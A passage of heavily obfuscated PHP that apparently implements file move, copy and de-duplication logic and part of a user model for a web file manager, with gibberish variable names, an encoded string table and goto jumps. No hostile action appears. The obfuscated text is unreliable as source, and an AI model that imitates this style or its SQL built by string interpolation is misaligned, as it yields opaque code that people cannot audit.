_childrenListSelect($éØ‹Ê¹Ã) { $ı†É†óı =& $_SERVER[Á÷ ­Šë]; $ ÓàÏ£ò = array($ı†É†óı[502] => $éØ‹Ê¹Ã, $ı†É†óı[435] => $this->targetIsDelete); $™å¤Ìï = $this->where($ ÓàÏ£ò)->select(); $™å¤Ìï = $™å¤Ìï ? $™å¤Ìï : array(); $ÆğÒ®êó = array_to_keyvalue($™å¤Ìï, $ı†É†óı[407]); $this->_childrenListCache[$éØ‹Ê¹Ã] = $ÆğÒ®êó; foreach ($ÆğÒ®êó as $éØ‹Ê¹Ã => $¶ßİšâ) { $this->_childrenItemCache[$éØ‹Ê¹Ã] = $¶ßİšâ; } return $ÆğÒ®êó; } private function fileNameExistCache($é¶Ø…¬¹, $üĞâŸ¿) { $¨¢èÅÉ½ =& $_SERVER[Á÷ ­Šë]; $üĞâŸ¿ = strtolower($üĞâŸ¿); $è²İò³Œ = $this->_childrenList($é¶Ø…¬¹); foreach ($è²İò³Œ as $Šßšã‹ô) { if ($üĞâŸ¿ == strtolower($Šßšã‹ô[$¨¢èÅÉ½[28]])) { return $Šßšã‹ô[$¨¢èÅÉ½[407]]; } } return !1; } private function fileNameAutoCache($¶íúÈÈç, $°êÜÄ’‰, $¹ı…½, $»ÔÌìï) { $°éÒÒ» =& $_SERVER[Á÷ ­Šë]; $Óù¢İ¦ş = $this->_childrenList($¶íúÈÈç); $ôî³»¸§ = array_to_keyvalue($Óù¢İ¦ş, $°éÒÒ»[33], $°éÒÒ»[28]); return $this->fileNameAutoGet($ôî³»¸§, $°êÜÄ’‰, $¹ı…½, $»ÔÌìï); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($§à­¡ı, $â‡†§Ä, $ñÇùí’ = REPEAT_REPLACE, $±’Å­»‹ = '') { $»½ËŠµœ =& $_SERVER[Á÷ ­Šë]; $æà›¬§• = $this->sourceInfo($§à­¡ı); $…Õ¯óÛÒ = $this->sourceInfo($â‡†§Ä); if ($æà›¬§•[$»½ËŠµœ[502]] == $…Õ¯óÛÒ[$»½ËŠµœ[407]]) { if ($æà›¬§•[$»½ËŠµœ[435]] == $»½ËŠµœ[97]) { Model($»½ËŠµœ[433])->restore(array($§à­¡ı)); } if (!$±’Å­»‹ || $±’Å­»‹ == $æà›¬§•[$»½ËŠµœ[28]]) { return $§à­¡ı; } } $á–ï¢•¼ = $this->pathInfoMore($§à­¡ı); if ($this->isParentOf($§à­¡ı, $â‡†§Ä)) { return !1; } if (!$æà›¬§• || !$…Õ¯óÛÒ || $…Õ¯óÛÒ[$»½ËŠµœ[415]] != $»½ËŠµœ[97]) { return !1; } Hook::trigger($»½ËŠµœ[594], $á–ï¢•¼); $this->targetIsDelete = intval($æà›¬§•[$»½ËŠµœ[435]]); if ($æà›¬§•[$»½ËŠµœ[502]] == $â‡†§Ä && $±’Å­»‹ != $æà›¬§•[$»½ËŠµœ[28]]) { $®ÌñÍñ² = $this->fileNameExist($â‡†§Ä, $±’Å­»‹); if ($®ÌñÍñ² && $æà›¬§•[$»½ËŠµœ[415]] == $»½ËŠµœ[201]) { $““ïÇ×ø = $this->sourceInfo($®ÌñÍñ²); $¬üûË¼É = $this->fileHistory($““ïÇ×ø, $æà›¬§•[$»½ËŠµœ[471]], $æà›¬§•[$»½ËŠµœ[88]]); if (!$¬üûË¼É) { Model($»½ËŠµœ[474])->remove($æà›¬§•[$»½ËŠµœ[471]]); } $this->removeNow($§à­¡ı, !1); $this->folderSizeReset($â‡†§Ä); Hook::trigger($»½ËŠµœ[595], $á–ï¢•¼); return $®ÌñÍñ²; } } $§ÎõÜŠÌ = $±’Å­»‹ ? $±’Å­»‹ : $æà›¬§•[$»½ËŠµœ[28]]; $this->lockMoveStart($§à­¡ı); $this->lockWriteStart($â‡†§Ä, $§ÎõÜŠÌ); $½œäÎ = array($»½ËŠµœ[564] => array(), $»½ËŠµœ[596] => !1); $this->clearShare($§à­¡ı, $â‡†§Ä); $ãûãöúû = $this->fileNameExistCache($â‡†§Ä, $æà›¬§•[$»½ËŠµœ[28]]); $ˆçˆİğ¨ = $this->_move($§à­¡ı, $â‡†§Ä, $ñÇùí’, $½œäÎ, $±’Å­»‹); $this->sourceCacheClear(); if ($æà›¬§•[$»½ËŠµœ[415]] == $»½ËŠµœ[97] && $ãûãöúû) { $this->folderSizeResetChildren($ˆçˆİğ¨); } Model($»½ËŠµœ[203])->linkAdd($½œäÎ[$»½ËŠµœ[564]]); if ($ãûãöúû && $½œäÎ[$»½ËŠµœ[596]]) { $this->removeNow($§à­¡ı, !1); } $this->lockMoveEnd($§à­¡ı); $this->lockWriteEnd($â‡†§Ä, $§ÎõÜŠÌ); $this->folderSizeReset($æà›¬§•[$»½ËŠµœ[502]]); $this->folderSizeReset($â‡†§Ä); $Ó½œ¸Ú½ = array($æà›¬§•[$»½ËŠµœ[502]], $â‡†§Ä); if ($æà›¬§•[$»½ËŠµœ[415]] == $»½ËŠµœ[97]) { $Ó½œ¸Ú½[] = $§à­¡ı; } $this->updateModifyTime($Ó½œ¸Ú½); Model($»½ËŠµœ[568])->eventMove($§à­¡ı, $æà›¬§•[$»½ËŠµœ[502]], $â‡†§Ä); Hook::trigger($»½ËŠµœ[595], $á–ï¢•¼); return $ˆçˆİğ¨; } private function _move($·•âÆåé, $Ûí¾íİ, $õˆ·ıá³, &$œúú¯ÌÕ, $êÅŸ«œÄ = '') { $ß…ÈĞ•æ =& $_SERVER[Á÷ ­Šë]; $À×ÍÏÒÃ = $this->sourceInfo($·•âÆåé); $¨Ü¤ÊÚ  = $À×ÍÏÒÃ[$ß…ÈĞ•æ[415]] == $ß…ÈĞ•æ[97]; $Ó¤ß‰Á = $êÅŸ«œÄ ? $êÅŸ«œÄ : $À×ÍÏÒÃ[$ß…ÈĞ•æ[28]]; $£äš¾æ¯ = $this->fileNameExistCache($Ûí¾íİ, $Ó¤ß‰Á); $this->lockMoveStart($·•âÆåé); $this->lockWriteStart($Ûí¾íİ, $Ó¤ß‰Á); if (!$£äš¾æ¯) { return $this->_moveForce($·•âÆåé, $Ûí¾íİ, $Ó¤ß‰Á); } $©ì¬§ä = $£äš¾æ¯; $Æµ† = !1; if ($¨Ü¤ÊÚ ) { if ($õˆ·ıá³ == REPEAT_RENAME_FOLDER) { $Ó¤ß‰Á = $this->fileNameAuto($Ûí¾íİ, $Ó¤ß‰Á, $õˆ·ıá³, $¨Ü¤ÊÚ ); $©ì¬§ä = $this->_moveForce($·•âÆåé, $Ûí¾íİ, $Ó¤ß‰Á); } else { if ($õˆ·ıá³ == REPEAT_RENAME_FOLDER) { $õˆ·ıá³ = REPEAT_RENAME; } $µÁ«øÖ = $this->_childrenListSelect($·•âÆåé); foreach ($µÁ«øÖ as $şÈØğ»ı) { $this->_move($şÈØğ»ı[$ß…ÈĞ•æ[407]], $£äš¾æ¯, $õˆ·ıá³, $œúú¯ÌÕ); } $Æµ† = !0; } } else { if ($õˆ·ıá³ == REPEAT_SKIP) { $Æµ† = !0; } else { if ($õˆ·ıá³ == REPEAT_RENAME || $õˆ·ıá³ == REPEAT_RENAME_FOLDER) { $Ó¤ß‰Á = $this->fileNameAuto($Ûí¾íİ, $Ó¤ß‰Á, $õˆ·ıá³, $¨Ü¤ÊÚ ); $©ì¬§ä = $this->_moveForce($·•âÆåé, $Ûí¾íİ, $Ó¤ß‰Á); } else { if ($õˆ·ıá³ == REPEAT_REPLACE) { $öıÆæğ€ = $this->sourceInfoCache($£äš¾æ¯); $Ñ·œ¼¹˜ = $this->fileHistory($öıÆæğ€, $À×ÍÏÒÃ[$ß…ÈĞ•æ[471]], $À×ÍÏÒÃ[$ß…ÈĞ•æ[88]]); $Æµ† = !0; if ($Ñ·œ¼¹˜) { $œúú¯ÌÕ[$ß…ÈĞ•æ[564]][] = $À×ÍÏÒÃ[$ß…ÈĞ•æ[471]]; } } } } } if ($Æµ† && !$œúú¯ÌÕ[$ß…ÈĞ•æ[596]]) { $œúú¯ÌÕ[$ß…ÈĞ•æ[596]] = !0; } return $©ì¬§ä; } private function _moveForce($…Â Ê½, $»À¾ö­Œ, $âë ‘ÍÃ) { $´Ë‘¦™ˆ =& $_SERVER[Á÷ ­Šë]; $ùëóşŞö = $this->sourceInfo($…Â Ê½); $İ÷Ó • = $this->sourceInfo($»À¾ö­Œ); $¯‰Õ£…³ = $ùëóşŞö[$´Ë‘¦™ˆ[415]] == $´Ë‘¦™ˆ[97]; $íù›–Á = array($´Ë‘¦™ˆ[406] => $İ÷Ó •[$´Ë‘¦™ˆ[407]], $´Ë‘¦™ˆ[588] => $İ÷Ó •[$´Ë‘¦™ˆ[525]] . $İ÷Ó •[$´Ë‘¦™ˆ[407]] . $´Ë‘¦™ˆ[47], $´Ë‘¦™ˆ[584] => $İ÷Ó •[$´Ë‘¦™ˆ[416]], $´Ë‘¦™ˆ[585] => $İ÷Ó •[$´Ë‘¦™ˆ[508]], $´Ë‘¦™ˆ[587] => USER_ID, $´Ë‘¦™ˆ[425] => $âë ‘ÍÃ); $¿¬†±¶Ù = $ùëóşŞö[$´Ë‘¦™ˆ[416]] == SourceModel::TYPE_GROUP && $İ÷Ó •[$´Ë‘¦™ˆ[416]] == SourceModel::TYPE_GROUP && $ùëóşŞö[$´Ë‘¦™ˆ[508]] == $İ÷Ó •[$´Ë‘¦™ˆ[508]]; if (!$¿¬†±¶Ù && $this->moveClearAuth) { Model($´Ë‘¦™ˆ[506])->authClear($…Â Ê½); } $¦Åæ”‹î = $ùëóşŞö[$´Ë‘¦™ˆ[435]] == $´Ë‘¦™ˆ[97] && $İ÷Ó •[$´Ë‘¦™ˆ[435]] != $´Ë‘¦™ˆ[97]; if ($¦Åæ”‹î) { $íù›–Á[$´Ë‘¦™ˆ[434]] = 0; } if ($¯‰Õ£…³) { $È¹¯İ©ß = array($´Ë‘¦™ˆ[588] => array($´Ë‘¦™ˆ[548], $ùëóşŞö[$´Ë‘¦™ˆ[525]] . $ùëóşŞö[$´Ë‘¦™ˆ[407]] . $´Ë‘¦™ˆ[549])); $Ÿ’¼ñĞ = $ùëóşŞö[$´Ë‘¦™ˆ[525]] . $ùëóşŞö[$´Ë‘¦™ˆ[407]] . $´Ë‘¦™ˆ[47]; $øá’ß = $İ÷Ó •[$´Ë‘¦™ˆ[525]] . $İ÷Ó •[$´Ë‘¦™ˆ[407]] . $´Ë‘¦™ˆ[47] . $ùëóşŞö[$´Ë‘¦™ˆ[407]] . $´Ë‘¦™ˆ[47]; $ÅÅˆéã‡ = array($´Ë‘¦™ˆ[588] => array($´Ë‘¦™ˆ[597], "\x72\145\160\154\x61\143\145\50\160\x61\x72\x65\156\164\x4c\145\166\145\154\x2c\47{$Ÿ’¼ñĞ}\x27\54\47{$øá’ß}\x27\x29"), $´Ë‘¦™ˆ[584] => $İ÷Ó •[$´Ë‘¦™ˆ[416]], $´Ë‘¦™ˆ[585] => $İ÷Ó •[$´Ë‘¦™ˆ[508]]); if ($¦Åæ”‹î) { $ÅÅˆéã‡[$´Ë‘¦™ˆ[434]] = 0; } $this->where($È¹¯İ©ß)->data($ÅÅˆéã‡)->save(); } $this->where(array($´Ë‘¦™ˆ[422] => $…Â Ê½))->data($íù›–Á)->save(); return $…Â Ê½; } private function clearShare($³òŠ¾Üş, $Ï¤Œ»ä) { $Ú•½ÄÑ =& $_SERVER[Á÷ ­Šë]; $õÃÔìÊÄ = $this->sourceInfo($³òŠ¾Üş); $¿à»Áè‰ = $this->sourceInfo($Ï¤Œ»ä); if ($õÃÔìÊÄ[$Ú•½ÄÑ[508]] == $¿à»Áè‰[$Ú•½ÄÑ[508]] && $õÃÔìÊÄ[$Ú•½ÄÑ[416]] == $Ú•½ÄÑ[598]) { return; } $Ÿé³¬’Ó = array($Ú•½ÄÑ[525] => array($Ú•½ÄÑ[548], $õÃÔìÊÄ[$Ú•½ÄÑ[525]] . $³òŠ¾Üş . $Ú•½ÄÑ[549])); $¸¹ø×Ò» = $this->field($Ú•½ÄÑ[422])->where($Ÿé³¬’Ó)->getField($Ú•½ÄÑ[407], !0); if (!$¸¹ø×Ò») { return; } $Ÿé³¬’Ó = array($Ú•½ÄÑ[407] => array($Ú•½ÄÑ[7], $¸¹ø×Ò»), $Ú•½ÄÑ[499] => 1); $Çàˆ¡¦ş = Model($Ú•½ÄÑ[599])->field($Ú•½ÄÑ[492])->where($Ÿé³¬’Ó)->select(); if (!$Çàˆ¡¦ş) { return; } $Çàˆ¡¦ş = array_to_keyvalue($Çàˆ¡¦ş, $Ú•½ÄÑ[33], $Ú•½ÄÑ[492]); $Ÿé³¬’Ó = array($Ú•½ÄÑ[492] => array($Ú•½ÄÑ[7], $Çàˆ¡¦ş)); Model($Ú•½ÄÑ[599])->where($Ÿé³¬’Ó)->save(array($Ú•½ÄÑ[499] => 0)); Model($Ú•½ÄÑ[600])->where($Ÿé³¬’Ó)->delete(); } public function copyFolderFromIO($”¬¹¾şË, $âÜ¼ó¬¸, $ËåŒ²–’, $¿›œä¿, $Å´ŒˆÂ, $¼££ññâ = false) { $Õ“Â¿¯É =& $_SERVER[Á÷ ­Šë]; $ÁÌ†÷üŸ = array($Õ“Â¿¯É[565] => array(), $Õ“Â¿¯É[566] => array(), $Õ“Â¿¯É[564] => array(), $Õ“Â¿¯É[601] => array()); $«‹¬ÆÎÏ = $¼££ññâ ? $¼££ññâ : $”¬¹¾şË->pathThis($âÜ¼ó¬¸); $–Ê™Œ œ = $this->fileNameExist($ËåŒ²–’, $«‹¬ÆÎÏ); $“‰æÕıè = $this->mkdir($ËåŒ²–’, $«‹¬ÆÎÏ, $¿›œä¿); if (!$–Ê™Œ œ || $¿›œä¿ == REPEAT_RENAME_FOLDER) { $¿›œä¿ = !1; } if ($–Ê™Œ œ) { $this->_childrenAllMake($–Ê™Œ œ); } Hook::trigger($Õ“Â¿¯É[602]); $this->_copyChildTo($”¬¹¾şË, $âÜ¼ó¬¸, $“‰æÕıè, $¿›œä¿, $ÁÌ†÷üŸ, $Å´ŒˆÂ); Hook::trigger($Õ“Â¿¯É[603]); if ($“‰æÕıè) { $this->folderSizeResetChildren($“‰æÕıè); } $this->_childrenListClear(); Model($Õ“Â¿¯É[567])->addAll($ÁÌ†÷üŸ[$Õ“Â¿¯É[565]], array(), !0); Model($Õ“Â¿¯É[568])->eventCopy($“‰æÕıè); $this->saveAll($ÁÌ†÷üŸ[$Õ“Â¿¯É[566]]); Model($Õ“Â¿¯É[474])->linkAdd($ÁÌ†÷üŸ[$Õ“Â¿¯É[564]]); Model($Õ“Â¿¯É[474])->remove($ÁÌ†÷üŸ[$Õ“Â¿¯É[601]]); $this->folderSizeReset($ËåŒ²–’); $this->updateModifyTime($ËåŒ²–’); return $“‰æÕıè; } private function _copyChildTo($¸ĞÜç›’, $ÊşäÇ…, $á¸Òü¢§, $®˜·¬Ğ, &$è·„ßõ², $¸ë£Œ) { $â¢·—ğ =& $_SERVER[Á÷ ­Šë]; $¥½¾ìş = $this->sourceInfoCache($á¸Òü¢§); $ÙùòÂ ¿ = $¸ĞÜç›’->listPath($ÊşäÇ…); $ÙùòÂ ¿ = $ÙùòÂ ¿ ? $ÙùòÂ ¿ : array($â¢·—ğ[84] => array(), $â¢·—ğ[85] => array()); $¹•ğæü = array_merge($ÙùòÂ ¿[$â¢·—ğ[84]], $ÙùòÂ ¿[$â¢·—ğ[85]]); $‚¼é¿¥Æ = $this->_addFiles($¸ĞÜç›’, $ÙùòÂ ¿[$â¢·—ğ[84]], $¸ë£Œ); $Û ²€ÆÎ = array(); foreach ($¹•ğæü as &$Ş®øÉİ¼) { if (isset($‚¼é¿¥Æ[$Ş®øÉİ¼[$â¢·—ğ[28]]])) { $Ş®øÉİ¼ = $‚¼é¿¥Æ[$Ş®øÉİ¼[$â¢·—ğ[28]]]; } $Ş®øÉİ¼[$â¢·—ğ[415]] = $Ş®øÉİ¼[$â¢·—ğ[29]] == $â¢·—ğ[87]; $Ş®øÉİ¼[$â¢·—ğ[417]] = _get($Ş®øÉİ¼, $â¢·—ğ[178], $â¢·—ğ[33]); $Ş®øÉİ¼[$â¢·—ğ[88]] = _get($Ş®øÉİ¼, $â¢·—ğ[88], 0); $Ş®øÉİ¼[$â¢·—ğ[471]] = _get($Ş®øÉİ¼, $â¢·—ğ[471], 0); if (!isset($Ş®øÉİ¼[$â¢·—ğ[604]]) && $Ş®øÉİ¼[$â¢·—ğ[471]]) { $è·„ßõ²[$â¢·—ğ[601]][] = $Ş®øÉİ¼[$â¢·—ğ[471]]; } if ($®˜·¬Ğ) { $şõ¤¿ºÓ = $this->fileNameExistCache($á¸Òü¢§, $Ş®øÉİ¼[$â¢·—ğ[28]]); if ($şõ¤¿ºÓ) { if ($Ş®øÉİ¼[$â¢·—ğ[415]] || $®˜·¬Ğ == REPEAT_SKIP) { continue; } if ($®˜·¬Ğ == REPEAT_REPLACE) { $§ƒƒ¯É = $this->sourceInfoCache($şõ¤¿ºÓ); $«İ¬Å³Ç = $this->fileHistory($§ƒƒ¯É, $Ş®øÉİ¼[$â¢·—ğ[471]], $Ş®øÉİ¼[$â¢·—ğ[88]]); if ($«İ¬Å³Ç) { $è·„ßõ²[$â¢·—ğ[564]][] = $Ş®øÉİ¼[$â¢·—ğ[471]]; } continue; } else { if ($®˜·¬Ğ == REPEAT_RENAME) { $Ş®øÉİ¼[$â¢·—ğ[28]] = $this->fileNameAutoCache($á¸Òü¢§, $Ş®øÉİ¼[$â¢·—ğ[28]], $®˜·¬Ğ, !1); } } } } if (!$Ş®øÉİ¼[$â¢·—ğ[415]] && $Ş®øÉİ¼[$â¢·—ğ[471]]) { $è·„ßõ²[$â¢·—ğ[564]][] = $Ş®øÉİ¼[$â¢·—ğ[471]]; } $Û ²€ÆÎ[] = $this->_makeItemData($Ş®øÉİ¼, $¥½¾ìş, $Ş®øÉİ¼[$â¢·—ğ[28]]); } unset($Ş®øÉİ¼); if (!empty($Û ²€ÆÎ)) { $this->addAll($Û ²€ÆÎ); $this->_childrenListSelect($á¸Òü¢§); } $†ˆ„úÔ€ = $this->_childrenList($á¸Òü¢§); $†ˆ„úÔ€ = array_to_keyvalue($†ˆ„úÔ€, $â¢·—ğ[28]); foreach ($¹•ğæü as $Ş®øÉİ¼) { $§ƒƒ¯É = $†ˆ„úÔ€[$Ş®øÉİ¼[$â¢·—ğ[28]]]; $“²êï¡ = $§ƒƒ¯É[$â¢·—ğ[407]]; $this->_copyApplyMeta($§ƒƒ¯É, $è·„ßõ²); if ($Ş®øÉİ¼[$â¢·—ğ[29]] == $â¢·—ğ[87]) { $Ş®øÉİ¼[$â¢·—ğ[86]] = $¸ĞÜç›’->getPathInner($Ş®øÉİ¼[$â¢·—ğ[86]]); $this->_copyChildTo($¸ĞÜç›’, $Ş®øÉİ¼[$â¢·—ğ[86]], $“²êï¡, $®˜·¬Ğ, $è·„ßõ², $¸ë£Œ); } } } private function _addFiles($®ÔËüö, $ß×ÉÕ™, $Ò·‚üù) { $ˆ’äĞÂó =& $_SERVER[Á÷ ­Šë]; if (!$ß×ÉÕ™ || count($ß×ÉÕ™) == 0) { return array(); } $Öµüä¬“ = array(); foreach ($ß×ÉÕ™ as &$Ø×ÇÚƒ·) { Hook::trigger($ˆ’äĞÂó[605], $Ø×ÇÚƒ·); $Ø×ÇÚƒ·[$ˆ’äĞÂó[86]] = $®ÔËüö->getPathInner($Ø×ÇÚƒ·[$ˆ’äĞÂó[86]]); $Æ³Õà¦É = $®ÔËüö->hashSimple($Ø×ÇÚƒ·[$ˆ’äĞÂó[86]]); $¨áÍÅ· = $®ÔËüö->hashMd5($Ø×ÇÚƒ·[$ˆ’äĞÂó[86]]); if (strlen($¨áÍÅ·) > 10 && !isset($Öµüä¬“[$¨áÍÅ·])) { $Öµüä¬“[$¨áÍÅ·] = array(); } $Ø×ÇÚƒ·[$ˆ’äĞÂó[181]] = $Æ³Õà¦É; $Ø×ÇÚƒ·[$ˆ’äĞÂó[180]] = $¨áÍÅ·; Hook::trigger($ˆ’äĞÂó[606], $Ø×ÇÚƒ·); $Öµüä¬“[$¨áÍÅ·][] =& $Ø×ÇÚƒ·; if (count($Öµüä¬“[$¨áÍÅ·]) > 1) { $Ø×ÇÚƒ·[$ˆ’äĞÂó[604]] = !0; } } unset($Ø×ÇÚƒ·); $™Ü·‡ï¤ = array($ˆ’äĞÂó[180] => array($ˆ’äĞÂó[7], array_keys($Öµüä¬“))); $øŞŸ¼Î» = Model($ˆ’äĞÂó[607]); $Ê¯û™Ñ· = $øŞŸ¼Î»->where($™Ü·‡ï¤)->select(); $Ê¯û™Ñ· = $Ê¯û™Ñ· ? $Ê¯û™Ñ· : array(); foreach ($Ê¯û™Ñ· as $·Áò©¶) { if (!isset($Öµüä¬“[$·Áò©¶[$ˆ’äĞÂó[180]]])) { continue; } $—§’°­ = $Öµüä¬“[$·Áò©¶[$ˆ’äĞÂó[180]]]; foreach ($—§’°­ as &$Ø×ÇÚƒ·) { $Ø×ÇÚƒ·[$ˆ’äĞÂó[471]] = $·Áò©¶[$ˆ’äĞÂó[471]]; $Ø×ÇÚƒ·[$ˆ’äĞÂó[604]] = !0; } unset($Ø×ÇÚƒ·); } $ˆé†…ÃË = array(); foreach ($ß×ÉÕ™ as $¸µÕÖ‘Ù) { if (isset($¸µÕÖ‘Ù[$ˆ’äĞÂó[604]]) && $¸µÕÖ‘Ù[$ˆ’äĞÂó[604]]) { continue; } $ÑÕ’Ó­¿ = $®ÔËüö->getPathInner($¸µÕÖ‘Ù[$ˆ’äĞÂó[86]]); $ÒœŒÕÂÀ = $øŞŸ¼Î»->addFileMake($ÑÕ’Ó­¿, $¸µÕÖ‘Ù[$ˆ’äĞÂó[88]], $¸µÕÖ‘Ù[$ˆ’äĞÂó[181]], $¸µÕÖ‘Ù[$ˆ’äĞÂó[180]], $¸µÕÖ‘Ù[$ˆ’äĞÂó[28]], $Ò·‚üù); $ˆé†…ÃË[] = $ÒœŒÕÂÀ; } $øŞŸ¼Î»->addAll($ˆé†…ÃË); $™Ü·‡ï¤ = array($ˆ’äĞÂó[180] => array($ˆ’äĞÂó[7], array_keys($Öµüä¬“))); $Ê¯û™Ñ· = $øŞŸ¼Î»->where($™Ü·‡ï¤)->select(); $Ê¯û™Ñ· = $Ê¯û™Ñ· ? $Ê¯û™Ñ· : array(); foreach ($Ê¯û™Ñ· as $·Áò©¶) { if (!isset($Öµüä¬“[$·Áò©¶[$ˆ’äĞÂó[180]]])) { continue; } $Âšå‚™ =& $Öµüä¬“[$·Áò©¶[$ˆ’äĞÂó[180]]]; foreach ($Âšå‚™ as &$Ø×ÇÚƒ·) { $Ø×ÇÚƒ·[$ˆ’äĞÂó[471]] = $·Áò©¶[$ˆ’äĞÂó[471]]; } unset($Ø×ÇÚƒ·); } $»ãÌ‘¸É = array(); foreach ($ß×ÉÕ™ as $é¿ßòÌÍ) { $»ãÌ‘¸É[$é¿ßòÌÍ[$ˆ’äĞÂó[28]]] = $é¿ßòÌÍ; } return $»ãÌ‘¸É; } } define($_SERVER[Á÷ ­Šë][608], $_SERVER[Á÷ ­Šë][609]); $xidypwojfk = $_SERVER[Á÷ ­Šë][610]; goto a®½±±Ç“»; b¸Ó±É ”…: class UserModel extends ModelBase { protected $tableName = "\165\x73\x65\x72"; protected $tableMeta = array("\164\x61\x62\x6c\x65\116\141\x6d\145" => "\165\163\145\162\x5f\x6d\x65\x74\141", "\x6d\x65\x74\x61\x46\151\x65\154\x64" => "\165\163\145\162\111\104"); protected $simpleField = "\165\163\145\x72\x49\x44\54\x6e\151\143\x6b\x4e\x61\155\145\54\156\141\x6d\x65\x2c\x61\166\x61\x74\141\x72\54\163\145\170\54\x73\x74\x61\164\x75\163"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($¿ò©Ô¶ª) { $ƒ•¢Ş°„ =& $_SERVER[Á÷ ­Šë]; $Ÿ§‹”«¸ = $ƒ•¢Ş°„[2170]; return array($ƒ•¢Ş°„[1819] => array($¿ò©Ô¶ª[0], $Ÿ§‹”«¸), $ƒ•¢Ş°„[1821] => array($¿ò©Ô¶ª[0], $Ÿ§‹”«¸), $ƒ•¢Ş°„[2171] => array($¿ò©Ô¶ª[0], $Ÿ§‹”«¸)); } protected function getInfo($À­õ›‚­, $şÀ‰ÎôÎ = false) { $ßËŠÇôÁ = $this->getInfoSimple($À­õ›‚­); if (!is_array($ßËŠÇôÁ)) { return array(); } if ($şÀ‰ÎôÎ) { return $this->_getInfoApply($ßËŠÇôÁ); } return $this->cacheFunctionGet($_SERVER[Á÷ ­Šë][1823], $À­õ›‚­); } protected function getInfoFull($»Ì³Û®¨, $×ë”êşã = false) { $ÃÍ¡êË‘ = $this->getInfoSimple($»Ì³Û®¨); if (!is_array($ÃÍ¡êË‘)) { return array(); } if ($×ë”êşã) { return $this->_getInfoApply($ÃÍ¡êË‘, !0); } return $this->cacheFunctionGet($_SERVER[Á÷ ­Šë][2172], $»Ì³Û®¨); } private function _getInfoApply($Œğäè©œ, $Êœí« = false) { $¾ĞÏ••Ş =& $_SERVER[Á÷ ­Šë]; if (!$Œğäè©œ) { return $Œğäè©œ; } $ÎÒ‹»Ï¾ = md5($¾ĞÏ••Ş[2173] . $Œğäè©œ[$¾ĞÏ••Ş[884]] . $¾ĞÏ••Ş[2174] . $Œğäè©œ[$¾ĞÏ••Ş[28]]); $Œğäè©œ = $this->_listDataApplyItem($Œğäè©œ); $ı¡ÉÊ– = Model($¾ĞÏ••Ş[1249])->metaGet($Œğäè©œ[$¾ĞÏ••Ş[95]][$¾ĞÏ••Ş[407]]); $Œğäè©œ[$¾ĞÏ••Ş[2175]] = $ÎÒ‹»Ï¾; $Œğäè©œ[$¾ĞÏ••Ş[95]][$¾ĞÏ••Ş[2006]] = isset($ı¡ÉÊ–[$¾ĞÏ••Ş[2007]]) ? $ı¡ÉÊ–[$¾ĞÏ••Ş[2007]] : null; if ($Êœí«) { $Œğäè©œ[$¾ĞÏ••Ş[469]] = $this->metaGet($Œğäè©œ[$¾ĞÏ••Ş[1574]]); } return $Œğäè©œ; } protected function getInfoSimple($Ë‰Ğã×ú, $Ï˜¢ª®Ø = false) { $ƒÅëÆ²· =& $_SERVER[Á÷ ­Šë]; if (!$Ë‰Ğã×ú) { return array(); } if ($Ï˜¢ª®Ø) { $É¹…ó À = $this->where(array($ƒÅëÆ²·[1574] => intval($Ë‰Ğã×ú)))->find(); if (!is_array($É¹…ó À)) { return array(); } $É¹…ó À[$ƒÅëÆ²·[2176]] = Action($ƒÅëÆ²·[2177])->parseUrl($É¹…ó À[$ƒÅëÆ²·[2176]]); return $É¹…ó À; } return $this->cacheFunctionGet($ƒÅëÆ²·[1824], $Ë‰Ğã×ú); } protected function getInfoSimpleOuter($œÆ¡™ïÆ) { $ÈèíŠ—ş =& $_SERVER[Á÷ ­Šë]; if (!$œÆ¡™ïÆ || $œÆ¡™ïÆ == 0) { return array($ÈèíŠ—ş[1574] => $ÈèíŠ—ş[201], $ÈèíŠ—ş[28] => $ÈèíŠ—ş[170] . LNG($ÈèíŠ—ş[2178]) . $ÈèíŠ—ş[540], $ÈèíŠ—ş[2176] => STATIC_PATH . $ÈèíŠ—ş[2179]); } $ƒ“àüÏ» = $this->cacheFunctionGet($ÈèíŠ—ş[1824], $œÆ¡™ïÆ); $¾›‡ùË  = array_field_key($ƒ“àüÏ», explode($ÈèíŠ—ş[47], $this->simpleField)); if (!$¾›‡ùË ) { return array($ÈèíŠ—ş[1574] => $ÈèíŠ—ş[1116], $ÈèíŠ—ş[28] => $ÈèíŠ—ş[170] . LNG($ÈèíŠ—ş[2180]) . $ÈèíŠ—ş[540], $ÈèíŠ—ş[2176] => STATIC_PATH . $ÈèíŠ—ş[2181]); } $¾›‡ùË [$ÈèíŠ—ş[2176]] = Action($ÈèíŠ—ş[2177])->parseUrl($¾›‡ùË [$ÈèíŠ—ş[2176]]); return $¾›‡ùË ; } protected function groupUser($şÇİ¼Ó“) { } public static function errorLang($ñşåÕŠõ) { $õ³¹¾Ã° =& $_SERVER[Á÷ ­Šë]; $”¯îï–Ş = array(self::ERROR_USER_NOT_EXISTS => $õ³¹¾Ã°[2182], self::ERROR_USER_PASSWORD_ERROR => $õ³¹¾Ã°[2183], self::ERROR_USER_EXIST_NAME => $õ³¹¾Ã°[2184], self::ERROR_USER_EXIST_PHONE => $õ³¹¾Ã°[2185], self::ERROR_USER_EXIST_EMAIL => $õ³¹¾Ã°[2186], self::ERROR_USER_LOGIN_LOCK => $õ³¹¾Ã°[2187], self::ERROR_IP_NOT_ALLOW => $õ³¹¾Ã°[2188], self::ERROR_USER_EXIST_NICKNAME => $õ³¹¾Ã°[2189]); return LNG($”¯îï–Ş[$ñşåÕŠõ]); } public function getInfoByMeta($óñâàÀÃ, $¾¯Æ¿üò) { $’……©’ =& $_SERVER[Á÷ ­Šë]; $ç¤×ÏìÍ = Model($’……©’[2190])->where(array($’……©’[103] => $óñâàÀÃ, $’……©’[381] => $¾¯Æ¿üò))->find(); if ($ç¤×ÏìÍ) { return $this->getInfo($ç¤×ÏìÍ[$’……©’[1574]]); } return !1; } public function userLoginCheck($Õæëîıˆ, $š§»Éõß) { $Á·™¤û… =& $_SERVER[Á÷ ­Šë]; $ñ›áÕËœ = $this->userLoginFind($Õæëîıˆ); if (!$ñ›áÕËœ) { 